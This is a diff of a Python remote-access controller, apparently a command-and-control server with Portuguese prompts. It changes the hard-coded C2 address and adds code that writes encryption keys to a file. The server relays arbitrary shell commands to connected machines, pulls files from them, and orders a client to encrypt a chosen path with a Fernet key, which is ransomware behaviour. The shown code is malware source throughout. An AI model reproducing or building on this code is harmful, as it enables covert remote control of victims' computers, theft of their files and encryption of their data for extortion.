@@ -5,7 +5,7 @@ import os
 import time
 from cryptography.fernet import Fernet
 
-_HOST = '192.168.100.165'
+_HOST = '192.168.8.185'
 _PORT = 9991
 _MAX_MSG_SIZE = 4096 # estava 8192
 
@@ -124,6 +124,8 @@ if __name__ == "__main__":
                         #ext = True
                         #a = (3 / 0)
 
+
+
                     elif data[:4] == '/cmd':
                         if data[5:8] == 'cpy':
                             conn.send(('cmdcpy' + data[9:]).encode())
@@ -133,18 +135,30 @@ if __name__ == "__main__":
                             recv_files[0] = open(name_arq, 'wb')
                             recv_files[1] = None
                             print('{}Recebendo Arquivo...{}'.format(cores['red'], cores['yellow']))
+
+
+
                         elif data[5:9] == 'cryp':
                             encrypt_path = data[10:].strip()
                             key = Fernet.generate_key().decode().strip()
                             print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
                                                .format(cores['red'], cores['yellow'], encrypt_path, cores['red'], cores['green'], key))
                             conn.send(('cmdcryp' + encrypt_path + ':' + key).encode())
+
+                            keytxt = open('key', 'w+')
+                            keytxt.write(key)
+                            keytxt.close()
+
+
                         elif data[5:10] == 'dcryp':
                             decrypt_path = data[11:].strip()
                             key = input('\n{}Digite a chave para descriptografar o caminho {}{}{} > {}{}'.format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], cores['yellow']))
                             print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
                                                .format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], key))
                             conn.send(('cmddcryp' + decrypt_path + ':' + key).encode())
+
+
+
                         else:
                             # Se for comandos "normais"
                             conn.send(('cmd' + data[5:]).encode())
